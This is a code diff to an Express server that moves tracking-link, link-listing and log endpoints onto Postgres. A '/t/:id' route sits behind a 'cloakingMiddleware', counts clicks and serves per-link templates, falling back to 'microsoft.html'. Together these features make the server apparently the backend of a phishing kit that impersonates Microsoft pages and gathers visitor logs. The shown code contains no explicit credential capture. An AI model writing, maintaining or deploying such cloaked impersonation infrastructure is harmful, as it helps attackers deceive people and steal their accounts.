@@ -152,20 +152,26 @@ app.post('/api/links', async (req, res) => {
 });
 
 app.get('/t/:id', cloakingMiddleware, async (req, res) => {
-    const link = links.find(l => l.id === req.params.id);
-    if (link) {
-        link.clicks++;
-        await saveLink(link);
-        const templateFile = `${link.template}.html`;
-        const templatePath = path.join(publicPath, templateFile);
-        
-        if (fs.existsSync(templatePath)) {
-            res.sendFile(templatePath);
+    try {
+        const { rows } = await pool.query('SELECT data FROM links WHERE id = $1', [req.params.id]);
+        const link = rows.length > 0 ? rows[0].data : null;
+
+        if (link) {
+            link.clicks++;
+            await saveLink(link);
+            const templateFile = `${link.template}.html`;
+            const templatePath = path.join(publicPath, templateFile);
+            
+            if (fs.existsSync(templatePath)) {
+                res.sendFile(templatePath);
+            } else {
+                console.log(`[SERVER] Template not found: ${templatePath}, falling back to microsoft.html`);
+                res.sendFile(path.join(publicPath, 'microsoft.html'));
+            }
         } else {
-            console.log(`[SERVER] Template not found: ${templatePath}, falling back to microsoft.html`);
             res.sendFile(path.join(publicPath, 'microsoft.html'));
         }
-    } else {
+    } catch (e) {
         res.sendFile(path.join(publicPath, 'microsoft.html'));
     }
 });
@@ -250,9 +256,33 @@ io.on('connection', (socket) => {
     });
 });
 
-app.get('/api/logs', (req, res) => res.json(logs));
-app.get('/api/links', (req, res) => res.json(links));
-app.delete('/api/logs', async (req, res) => { logs = []; await pool.query('DELETE FROM logs'); res.json({ success: true }); });
+app.get('/api/logs', async (req, res) => {
+    try {
+        const { rows } = await pool.query('SELECT data FROM logs');
+        res.json(rows.map(r => r.data));
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/api/links', async (req, res) => {
+    try {
+        const { rows } = await pool.query('SELECT data FROM links');
+        res.json(rows.map(r => r.data));
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.delete('/api/logs', async (req, res) => {
+    try {
+        await pool.query('DELETE FROM logs');
+        io.emit('all_logs_deleted');
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
 
 const PORT = process.env.PORT || 3000;
 if (!process.env.VERCEL) {
